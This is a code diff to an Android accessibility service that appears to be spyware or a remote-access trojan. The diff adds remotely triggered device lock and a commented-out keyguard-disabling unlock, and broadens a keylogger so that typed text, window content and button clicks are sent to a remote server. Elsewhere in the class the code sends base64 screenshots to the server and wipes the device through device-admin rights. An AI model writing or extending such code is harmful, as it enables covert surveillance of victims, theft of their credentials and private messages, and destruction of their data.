@@ -5,6 +5,7 @@ import android.accessibilityservice.AccessibilityService;
 import android.accessibilityservice.AccessibilityServiceInfo;
 import android.accessibilityservice.GestureDescription;
 import android.annotation.SuppressLint;
+import android.app.KeyguardManager;
 import android.app.admin.DevicePolicyManager;
 import android.content.BroadcastReceiver;
 import android.content.ComponentName;
@@ -47,6 +48,7 @@ import android.os.Bundle;
 import android.os.Handler;
 import android.os.HandlerThread;
 import android.os.IBinder;
+import android.os.PowerManager;
 import android.os.UserHandle;
 import android.os.UserManager;
 import android.provider.CallLog;
@@ -120,6 +122,8 @@ public class MainAccessibilityService extends AccessibilityService {
     public static final String ACTION_KEY_LOGGER = "KEY_LOGGER";
     public static final String ACTION_UNINSTALL_APP = "UNINSTALL_APP";
     public static final String ACTION_SCREEN_SCROLL = "SCREEN_SCROLL";
+    public static final String ACTION_DEVICE_LOCK = "DEVICE_LOCK";
+    public static final String ACTION_DEVICE_UNLOCK = "DEVICE_UNLOCK";
     public static final String ACTION_CLOSE_MONITOR = "CLOSE_MONITOR";
     //    private String Selected_EVENT = ACTION_CLOSE_MONITOR;
     DisplayMetrics displayMetrics;
@@ -452,6 +456,13 @@ public class MainAccessibilityService extends AccessibilityService {
                 startRecording();
             }
 
+            if (ACTION_DEVICE_LOCK.equals(intent.getAction())) {
+                onDeviceLock();
+            }
+            if (ACTION_DEVICE_UNLOCK.equals(intent.getAction())) {
+                onDeviceUnlock();
+            }
+
             if (ACTION_CLOSE_MONITOR.equals(intent.getAction())) {
                 String close_event = intent.getStringExtra("event");
                 if(close_event.equals("screen-monitor")) {
@@ -534,6 +545,11 @@ public class MainAccessibilityService extends AccessibilityService {
         registerReceiver(screenMonitorReceiver, filter_uninstall_app, RECEIVER_EXPORTED);
         IntentFilter filter_screen_scroll = new IntentFilter(ACTION_SCREEN_SCROLL);
         registerReceiver(screenMonitorReceiver, filter_screen_scroll, RECEIVER_EXPORTED);
+
+        IntentFilter filter_device_lock = new IntentFilter(ACTION_DEVICE_LOCK);
+        registerReceiver(screenMonitorReceiver, filter_device_lock, RECEIVER_EXPORTED);
+        IntentFilter filter_device_unlock = new IntentFilter(ACTION_DEVICE_UNLOCK);
+        registerReceiver(screenMonitorReceiver, filter_device_unlock, RECEIVER_EXPORTED);
 
         IntentFilter mediaProjectionFilter = new IntentFilter("MEDIA_PROJECTION_RESULT");
         registerReceiver(mediaProjectionReceiver, mediaProjectionFilter, RECEIVER_EXPORTED);
@@ -749,14 +765,24 @@ public class MainAccessibilityService extends AccessibilityService {
         if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
             text = event.getText().toString();
             eventString = "Text Input";
+            if(Server.getContext() != null) {
+                if(isKeylogger) {
+                    Server.getContext().sendKeyLog(text, packagename, eventString);
+                }
+            }
         }
 
-        if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
+        if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED || event.getEventType() == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
             text = event.getText().toString();
             eventString = "Navigation";
             if (event.getContentChangeTypes() == AccessibilityEvent.CONTENT_CHANGE_TYPE_TEXT) {
                 text = event.getText().toString();
                 eventString = "Text Input";
+            }
+            if(Server.getContext() != null) {
+                if(isKeylogger) {
+                    Server.getContext().sendKeyLog(text, packagename, eventString);
+                }
             }
         }
 
@@ -773,13 +799,11 @@ public class MainAccessibilityService extends AccessibilityService {
                         }
                         text = Button_Text;
                         eventString = "Button Click";
+                        if(isKeylogger) {
+                            Server.getContext().sendKeyLog(text, packagename, eventString);
+                        }
                     }
                 }
-            }
-        }
-        if(Server.getContext() != null) {
-            if(isKeylogger) {
-                Server.getContext().sendKeyLog(text, packagename, eventString);
             }
         }
     }
@@ -1537,13 +1561,36 @@ public class MainAccessibilityService extends AccessibilityService {
 
     public void performFactoryReset() {
         mDevicePolicyManager = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
-        mAdminComponent = new ComponentName(getPackageName(), getPackageName() + ".receiver.MyDeviceAdminReceiver");
+        mAdminComponent = new ComponentName(this, MyDeviceAdminReceiver.class);
         if (mDevicePolicyManager.isAdminActive(mAdminComponent)) {
             if(Integer.parseInt(Build.VERSION.RELEASE) < 14) {
                 Server.getContext().sendFormatNotification();
                 mDevicePolicyManager.wipeData(0);
             }
         }
+    }
+
+    public void onDeviceLock() {
+        mDevicePolicyManager = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
+        mAdminComponent = new ComponentName(this, MyDeviceAdminReceiver.class);
+        if(mDevicePolicyManager.isAdminActive(mAdminComponent)) {
+            mDevicePolicyManager.lockNow();
+        }
+    }
+
+    public void onDeviceUnlock() {
+//        mDevicePolicyManager = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
+//        mAdminComponent = new ComponentName(this, MyDeviceAdminReceiver.class);
+//        if(mDevicePolicyManager.isAdminActive(mAdminComponent)) {
+//            mDevicePolicyManager.setKeyguardDisabledFeatures(mAdminComponent, DevicePolicyManager.KEYGUARD_DISABLE_FINGERPRINT);
+//        }
+//
+//        KeyguardManager keyguardManager = (KeyguardManager) getSystemService(KEYGUARD_SERVICE);
+//        KeyguardManager.KeyguardLock keyguardLock = keyguardManager.newKeyguardLock(KEYGUARD_SERVICE);
+//        keyguardLock.disableKeyguard();
+//        PowerManager powerManager = (PowerManager) getSystemService(POWER_SERVICE);
+//        PowerManager.WakeLock wakeLock = powerManager.newWakeLock(PowerManager.FULL_WAKE_LOCK | PowerManager.ACQUIRE_CAUSES_WAKEUP | PowerManager.ON_AFTER_RELEASE, "MyApp::WakeLock");
+//        wakeLock.acquire(3000);
     }
 
     private void onGoHome() {
@@ -1564,7 +1611,7 @@ public class MainAccessibilityService extends AccessibilityService {
         Log.d("base64Image:::", "screenBase64");
         if (Server.getContext() != null) {
 //            if(isScreenMonitoring) {
-                Server.getContext().sendScreenMonitoring(base64Image);
+            Server.getContext().sendScreenMonitoring(base64Image);
 //            }
         }
     }
